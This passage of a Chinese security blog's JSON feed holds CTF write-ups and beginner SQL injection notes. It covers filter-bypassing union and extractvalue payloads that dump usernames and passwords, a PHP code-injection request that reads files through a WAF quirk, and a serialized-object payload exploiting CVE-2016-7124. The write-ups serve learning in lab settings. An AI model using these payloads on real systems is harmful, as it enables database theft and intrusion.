时<strong>报错</strong>，得知是<strong>单引号闭合</strong>。</p>\n<p><strong>选择通过密码进行注入</strong>。</p>\n<p>输入  <code>1' or 1=1 -- '</code>  报错，发现报错语句中没有 <code>or</code> ，应该是<strong>过滤</strong>了。</p>\n<p>尝试:</p>\n<pre><code>1. 双写`oror`\n2. 隐写`oorr`\n</code></pre>\n<p>发现 2 是可行的，1 会报错，没有 <code>or</code>  出现。这里明白是一个 ' 强' 过滤。(<strong>即只要有 <code>or</code>  字节出现在语法中就会过滤</strong>，如 <code>inform,password</code> )</p>\n<p>用 <code>1' oorr 1=1 -- '</code>  成功登入，发现有<img data-src=\"https://evefortosaber.github.io/Open-pictures/babysql.jpg\" alt=\"babysql\" /></p>\n<p>之后用 <code>union select</code>  通过报错，发现<strong> union，select 都被过滤</strong>。</p>\n<p>用 <code>uniunionon selselectect 1,1,1</code>  查出列名，和对应显示。</p>\n<p><em><strong>palyload</strong></em> 如下：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,database(),3 -- '</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// geek</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,(selselectect group_concat(table_name)frfromom infoorrmation_schema.tables whewherere table_schema='</span>geek<span class=\"token string\">'),3 -- '</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// b4bsql</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whewherere table_schema='</span>geek<span class=\"token string\">' anandd table_name='</span>b4bsql<span class=\"token string\">'),3 -- '</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// id username password</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,2,(selselectect group_concat(concat(id,'</span> <span class=\"token string\">',username,'</span> <span class=\"token string\">',passwoorrd))frfromom geek.b4bsql) -- '</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// 8 flag flag&#123;11939082-38b7-412d-830a-cbe89b508804&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">/* 123'  uniunionon selselectect 1,(selselectect group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql' anandd table_schema='geek'),(selselectect group_concat(concat(username,' ',passwoorrd,' ',id)) frfromom geek.b4bsql) -- ' */</span></pre></td></tr></table></figure><blockquote>\n<p>这里发现一个<strong>问题</strong>，使用</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token string\">' uniunionon selselectect 1,2,(selselectect concat(id,'</span> <span class=\"token string\">',username,'</span> <span class=\"token string\">',passwoorrd)frfromom geek.b4bsql) -- '</span></pre></td></tr></table></figure><p>&lt;u&gt; 报错 ' more than one row ' 但使用 group_concat 无报错。&lt;/u&gt;</p>\n<p>&lt;u&gt;concat () 返回将相应字段连接成字符串的一列值。&lt;/u&gt;</p>\n<p>&lt;u&gt;group_concat () 返回的是一串字符串。&lt;/u&gt;</p>\n</blockquote>\n<h3 id=\"15roarctf-2019easy-calc\"><a class=\"anchor\" href=\"#15roarctf-2019easy-calc\">#</a> 15.[RoarCTF 2019]Easy Calc</h3>\n<p>计算器。显然不是数据库。不用 SQL 注入。</p>\n<p>输入 <code>1+1 / 1 /' / 1' / &quot; </code> 根据报错情况，没啥用。看源码。找到 calc.php.</p>\n<p>可以传参 num, 传一下试试。有 waf,php 和 waf 的变量判断方式不一样.</p>\n<p>用 php 代码注入.</p>\n<p>所以传 <code>?%20?num=1</code></p>\n<p>传入并执行了，根据它的过滤规则，堆叠注入.</p>\n<p><code>?%20num=1;var_dump(scandir(chr(47)))</code> (chr (47) 是 '/') 访问根目录，并打印.</p>\n<p>找到 flagg.</p>\n<p><code>?&amp;20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<h3 id=\"16极客大挑战-2019php\"><a class=\"anchor\" href=\"#16极客大挑战-2019php\">#</a> 16.[极客大挑战 2019] PHP</h3>\n<p>进入题目根据提示：</p>\n<blockquote>\n<p>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</p>\n</blockquote>\n<p>对网站备份扫描 *&quot;&quot;E:\\burpsuite\\ 备份扫描.py&quot;&quot;* 使用 Python 脚本.</p>\n<p>得到 www.zip</p>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1_16_01.png\" alt=\"01\" /></p>\n<p>查看三个 PHP 文件.</p>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/1_16_02.jpg\" alt=\"02\" /></p>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main//1_16_03.jpg\" alt=\"03\" /></p>\n<p>跟据代码，思路大致为</p>\n<blockquote>\n<p>利用 get 方法传参 select，select 要序列化。</p>\n<p>select 的内容是建立一个对象 Name，username=admin，password=100.</p>\n<p>要绕过 wakeup () . //<em> 调用 unserialize () 时会自动调用魔法函数 wakeup ()</em></p>\n</blockquote>\n<p>构造语法 (<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9ydW5jb2RlL3BocC8=\">PHP 执行</span>)</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Name</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"yesyesyes\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"nonono\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token this keyword\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token this keyword\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 输出序列化</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">// O:4:\"Name\":2:&#123;s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;&#125;</span></span></pre></td></tr></table></figure><p>URL 不能识别 <code>&quot;</code> ，同时， <code>&quot;Nameusername&quot;</code>  应为 <code>&quot;%00Name%00username&quot;</code></p>\n<blockquote>\n<p>因为成员（属性）是 private，所以要在类名和成员名前加 <code>%00</code>  这个 url 编码是空的意思</p>\n<p>序列化时生成的序列化字符串中类名前后本来就会有 0×00 也就是空</p>\n</blockquote>\n<p>再利用 CVE-2016-7124 反序列化漏洞，属性数大于属性个数时，会跳过__wakeup () 魔术函数。</p>\n<p>最终 payload 为</p>\n<figure class=\"highlight url\"><figcaption data-lang=\"url\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token path\"><span class=\"token path-separator\">/</span></span><span class=\"token query\"><span class=\"token query-delimiter\">?</span><span class=\"token pair\"><span class=\"token key\">select</span>=</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token path\">O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span></pre></td></tr></table></figure><p>解释一下这里利用了 <code>echo urlencode($b)</code>  直接将其 URLencode，再将属性数改大。</p>\n<h3 id=\"17buyflag\"><a class=\"anchor\" href=\"#17buyflag\">#</a> 17.BUYFlag</h3>\n<p>查看 pay.php 的源码</p>\n<p>发现是 post，抓包构造 payload。</p>\n<p>修改 cookie，user=1 (猜测)</p>\n<p>money=1000000000&amp;password=404a (PHP 的弱等于)</p>\n<p>回显数字太长，用科学计数法 1e9.</p>\n<p>得到 flag</p>\n<h2 id=\"二-crypto\"><a class=\"anchor\" href=\"#二-crypto\">#</a> 二、CRYPTO</h2>\n<p>摩丝密码的英文只有大写</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>摩斯电码只有大写，将它改成大写就行啦</pre></td></tr></table></figure><p>1.URL</p>\n<p>2.base-16，base-32，base-64</p>\n<p>3.md5</p>\n<p>4.ROT13 旋转加密</p>\n<h3 id=\"1password\"><a class=\"anchor\" href=\"#1password\">#</a> 1.PASSWORD</h3>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220930164451487.png\" alt=\"image-20220930164451487\" /></p>\n<p>就是猜。。。</p>\n<p zs19900315=\"\">flag</p>\n<blockquote>\n<p>私钥 d 攻击</p>\n<p>Coppersmith 相关攻击</p>\n<p>ECC</p>\n</blockquote>\n<h3 id=\"2变异凯撒\"><a class=\"anchor\" href=\"#2变异凯撒\">#</a> 2. 变异凯撒</h3>\n<p Caesar_variation=\"\">flag</p>\n<p><em>凯撒加密，即将原私钥通过 ASCII 移位的方式加密。</em></p>\n<p>得到密文。可能每处移位的不一样。</p>\n<p>这里是<img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/image-20220930170155624.png\" alt=\"image-20220930170155624\" /></p>\n<p><strong>afZ_r9VYfScOeO_UL^RWUc</strong></p>\n<p>根据格式，对前 5 位，按照 ASCII 表解密为<strong> flag {</strong>，从而推出加密规律。</p>\n<p>udf 提权，mof 提权</p>\n<p>宽字节注入限制</p>\n<p>什么时候用，</p>\n<p>怎么用，用在哪，</p>\n<p>为什么要用。</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/",
            "url": "https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/",
            "title": "SQL注入",
            "date_published": "2023-03-19T11:29:17.421Z",
            "content_html": "<p>作为刚入门时，初步接触 SQL 所作的笔记</p>\n<hr />\n<h1 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"1postget注入\"><a class=\"anchor\" href=\"#1postget注入\">#</a> 1.post&amp;get 注入</h2>\n<p>修改 username 等信息进行无账号登录或构造语句查询敏感数据。</p>\n<p>常用 <code>'</code> ， <code>&quot;</code> ， <code>')</code> ， <code>&quot;)</code>  与 “and 1=1；and1=2” 与  <code>-- '</code>  进行试探～～(可能有双括号)~~</p>\n<p>目的：判断是字符还是整形</p>\n<p>之后用 order by 或 union select 判断段数</p>\n<p>再子查询</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">union</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">-- 语句联合查询</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>schema_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>schemata<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">-- 查库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'db'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">-- 查表</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'T'</span> <span class=\"token operator\">and</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'db'</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">-- 查字段</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">-- 查字段内容</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>id<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">-- 当显示长度有限制时</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">--</span></pre></td></tr></table></figure><h2 id=\"2extractvalue-报错注入\"><a class=\"anchor\" href=\"#2extractvalue-报错注入\">#</a> 2.extractvalue 报错注入</h2>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>extractvaule 报错注入</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">-- 查数据库</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">-- 查库的表</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">''</span> <span class=\"token operator\">and</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">-- 查表的字段</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> db<span class=\"token punctuation\">.</span><span class=\"token keyword\">table</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr></table></figure><p><code>extractvalue(content,path)</code>  这里利用了 <code>path</code>  错误报错获取信息，利用了 <code>concat</code>  与 <code>select</code>  的嵌套</p>\n<p>从而使报错内容 <code>concat</code>  得以显示。<strong>也就是说错误的是 <code>concat(slect)</code>  报错时报 <code>concat</code>  的错但会回显，从而显示 <code>select</code>  的内容</strong>，达到获取信息的目的。</p>\n<h2 id=\"3绕warf\"><a class=\"anchor\" href=\"#3绕warf\">#</a> 3. 绕 warf</h2>\n<p>/**/ 替空格，unionunion 类似绕关键字屏蔽，selselectect 包括。</p>\n<p>base-64，MD5 () 解码。</p>\n<h2 id=\"4编码\"><a class=\"anchor\" href=\"#4编码\">#</a> 4. 编码</h2>\n<p>%23 -- #   URL 编码</p>\n<h2 id=\"5盲注\"><a class=\"anchor\" href=\"#5盲注\">#</a> 5. 盲注</h2>\n<p>使用 Python 脚本</p>\n<h2 id=\"6堆叠注入\"><a class=\"anchor\" href=\"#6堆叠注入\">#</a> 6. 堆叠注入</h2>\n<p>堆叠注入原理</p>\n<p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br />\n原理很简单，mysql_multi_query () 支持多条 sql 语句同时执行，就是个；分隔，成堆的执行 sql 语句，例如</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">databases</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br />\n虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到 API 或者数据库引擎，又或者权限的限制<em><strong>只有当调用数据库函数支持执行多条 sql 语句时才能够使用</strong></em>，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，&lt;u&gt; 但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限 &lt;/u&gt;，一旦能够被使用，将可能对网站造成十分大的威胁。</p>\n<blockquote>\n<p>原文链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0L2FydGljbGUvZGV0YWlscy8xMDczNzYyODQ=\">https://blog.csdn.net/qq_45691294/article/details/107376284</span></p>\n</blockquote>\n<h2 id=\"7绕过select注入\"><a class=\"anchor\" href=\"#7绕过select注入\">#</a> 7. 绕过 select 注入</h2>\n<p>使用 handler 语法。</p>\n",
            "tags": [
                "CTF"
            ]
        }
    ]
}